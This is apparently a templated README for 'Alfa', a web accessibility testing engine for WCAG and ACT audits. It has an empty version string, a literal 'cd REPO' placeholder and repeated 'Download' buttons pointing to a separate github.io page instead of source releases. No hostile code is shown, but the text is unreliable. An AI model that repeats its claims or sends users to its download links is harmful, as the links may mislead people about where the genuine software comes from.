# Alfa - accessibility testing engine 2026

> **Alfa is a web-based accessibility testing engine for standards-oriented audits, helping teams evaluate HTML, CSS, and JavaScript against WCAG and ACT rules in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/henrygrayva7659/alfa-html-css-audit?style=flat-square)](https://github.com/henrygrayva7659/alfa-html-css-audit)

---

<p align="center">
  <a href="https://henrygrayva7659.github.io/alfa-html-css-audit/">
    <img src="https://img.shields.io/badge/Download-Alfa%20Latest-brightgreen?style=for-the-badge" alt="Download Alfa">
  </a>
</p>

> **[Download Alfa v](https://henrygrayva7659.github.io/alfa-html-css-audit/)**

---

[Download Latest Build](https://henrygrayva7659.github.io/alfa-html-css-audit/)

---

## What Alfa Does

Alfa provides repeatable accessibility conformance checks for web content and application interfaces. Its rule-based approach examines page structure and behavior, supporting everything from formal audits and regression testing to reviews across larger collections of pages.

The engine is intended for teams working with accessibility, A11y, WCAG, and ACT requirements. Its structured output can be passed to reporting and data-processing systems, while crawler and scraper integrations allow it to operate in both automated pipelines and focused assessment workflows.

---

## Capabilities

- Perform accessibility conformance checks using established standards
- Inspect web pages containing HTML, CSS, and JavaScript
- Evaluate content with ACT rules at the individual rule level
- Apply WCAG rules for common accessibility concerns
- Produce audit data in EARL and JSON-LD
- Support reporting workflows that use SARIF-compatible data
- Connect with crawlers and scrapers to extend audit coverage
- Run scans through a command-line interface
- Work within a monorepo containing npm packages and TypeScript tooling

---

## Install Alfa

Use the following commands to retrieve the repository and install its npm dependencies:

```bash
git clone https://github.com/henrygrayva7659/alfa-html-css-audit.git
cd REPO
npm install
```

Once installation is complete, launch the CLI from the repository root through the package entry point or the workspace command documented for your environment.

---

## Running Audits

A normal Alfa workflow consists of scanning, exporting, and reviewing results:

1. Point Alfa at a page, site, or captured input.
2. Select the output representation required by your process, including EARL, JSON-LD, or SARIF-compatible data.
3. Examine the reported findings and pass them into your accessibility review workflow.
4. Re-run the audit after changes to identify regressions.

Common ways to use the workflow include:

- Check one page for matching accessibility rules
- Crawl multiple pages to increase coverage
- Export findings for reports or additional processing
- Add audits to CI or a release workflow

---

## Settings and Configuration

The available configuration depends on whether Alfa is being run through the CLI, workspace packages, or crawler and scraper integrations. Typical setups receive options from command-line arguments, project configuration files, or integration-specific settings.

When local configuration is required, store it close to the project root. Document required paths, selected rules, and export destinations next to the command used to run Alfa.

---

## Requirements

- An environment intended for web targets
- npm for dependency installation
- A TypeScript-compatible toolchain
- Access to the pages or assets selected for auditing
- Enough storage for crawl data and generated audit exports

For the most reliable setup, use a current Node.js runtime compatible with the repository's package and workspace configuration.

---

## Frequently Asked Questions

**How can I make sure the audit reflects recent changes?**  
Run Alfa again whenever the code, content, or page structure changes so the generated findings represent the current state.

**Does Alfa work in automated processes?**  
Yes. Its CLI and structured result formats support scripted checks and integration with pipeline workflows.

**Where does Alfa write its findings?**  
The destination depends on the selected export format and surrounding workflow. Alfa can emit EARL, JSON-LD, and other supported report-oriented output.

**How can I handle a crawl that covers too much or takes too long?**  
Adjust the crawler or scraper configuration by narrowing the scope, reducing crawl depth, or selecting particular site sections.

**What should I inspect when the output seems unexpected?**  
Review the active rule set, input URLs, command-line options, and local configuration used by the workspace packages.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
